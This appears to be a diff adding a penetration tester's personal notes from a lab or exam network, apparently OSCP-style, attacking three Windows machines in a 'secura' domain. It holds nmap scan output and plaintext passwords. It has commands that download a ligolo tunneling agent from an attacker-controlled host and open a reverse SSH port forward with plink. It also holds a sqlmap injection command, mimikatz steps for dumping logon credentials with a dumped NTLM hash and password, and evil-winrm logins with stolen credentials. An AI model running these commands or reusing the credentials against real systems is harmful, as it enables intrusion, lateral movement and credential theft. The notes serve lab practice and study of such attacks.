@@ -1,0 +1,102 @@
+192.168.XXX.97	VM 1
+	sudo nmap -sV 192.168.141.97 --top-ports 1000
+	PORT    STATE SERVICE      VERSION
+	53/tcp   open  domain       Simple DNS Plus
+	88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-25 16:10:49Z)
+	135/tcp  open  msrpc        Microsoft Windows RPC
+	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+	389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
+	445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: SECURA)
+	464/tcp  open  kpasswd5?
+	593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+	636/tcp  open  tcpwrapped
+	3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
+	3269/tcp open  tcpwrapped
+	5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+192.168.XXX.96	VM 2
+	sudo nmap -sV 192.168.141.96 --top-ports 100
+	PORT     STATE SERVICE       VERSION
+	135/tcp  open  msrpc         Microsoft Windows RPC
+	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+	445/tcp  open  microsoft-ds?
+	3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
+	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+	root eK6q1CJ9697s7O 
+192.168.XXX.95	VM 3
+	Eric.Wallows / EricLikesRunning800
+	FLAG -> C:\Users\Administrator\Desktop\proof.txt
+	rdp -> user is logged in
+	http://192.168.141.95:44444/index.do -> ManageEngine App Manager
+	sudo nmap -sV 192.168.141.95 --top-ports 100
+	PORT     STATE SERVICE       VERSION
+	135/tcp  open  msrpc         Microsoft Windows RPC
+	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+	445/tcp  open  microsoft-ds?
+	3389/tcp open  ms-wbt-server Microsoft Terminal Services
+	8443/tcp open  ssl/https-alt AppManager
+
+Invoke-WebRequest -Uri "http://192.168.45.219/ligolo/agent.exe" -OutFile "agent.exe"
+Invoke-WebRequest -Uri "http://192.168.45.219/wintun/bin/amd64" -OutFile "wintun.dll"
+plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3306 192.168.45.219
+sqlmap -u http://192.168.141.96/blindsqli.php?user=1 -p user
+
+
+ligolo
+
+mimikatz dump secure logon  
+- drop mimikatz on target, run powershell as admin
+- priviliege::debug
+- token::elevate
+- sekursa::logonpasswords
+
+	Authentication Id : 0 ; 712535 (00000000:000adf57)
+	Session           : Interactive from 1
+	User Name         : Administrator
+	Domain            : SECURE
+	Logon Server      : SECURE
+	Logon Time        : 2/20/2025 9:58:06 PM
+	SID               : S-1-5-21-3197578891-1085383791-1901100223-500
+			msv :
+			[00000003] Primary
+			* Username : Administrator
+			* Domain   : SECURE
+			* NTLM     : a51493b0b06e5e35f855245e71af1d14
+			* SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
+			tspkg :
+			wdigest :
+			* Username : Administrator
+			* Domain   : SECURE
+			* Password : (null)
+			kerberos :
+			* Username : Administrator
+			* Domain   : SECURE
+			* Password : (null)
+			ssp :
+			credman :
+			[00000000]
+			* Username : apache
+			* Domain   : era.secura.local
+			* Password : New2Era4.!
+			cloudap :
+
+crackmapexec , dumping creds brute force using service 
+
+evil-winrm -i 192.168.135.96 -u 'apache' -p 'New2Era4.!'
+whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+
+	Privilege Name                Description                          State
+	============================= ==================================== =======
+	SeShutdownPrivilege           Shut down the system                 Enabled
+	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+	SeUndockPrivilege             Remove computer from docking station Enabled
+	SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+	SeTimeZonePrivilege           Change the time zone                 Enabled
+
+# change these includes
+Get-ChildItem -Path C:\ -Recurse -Include *.ps1,*.bat,*.vbs,*.xml,*.config -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+evil-winrm -i 192.168.x.x -u 'user' -p 'pass' -c "command" > output.txt
+download file.txt -> within evil-winrm
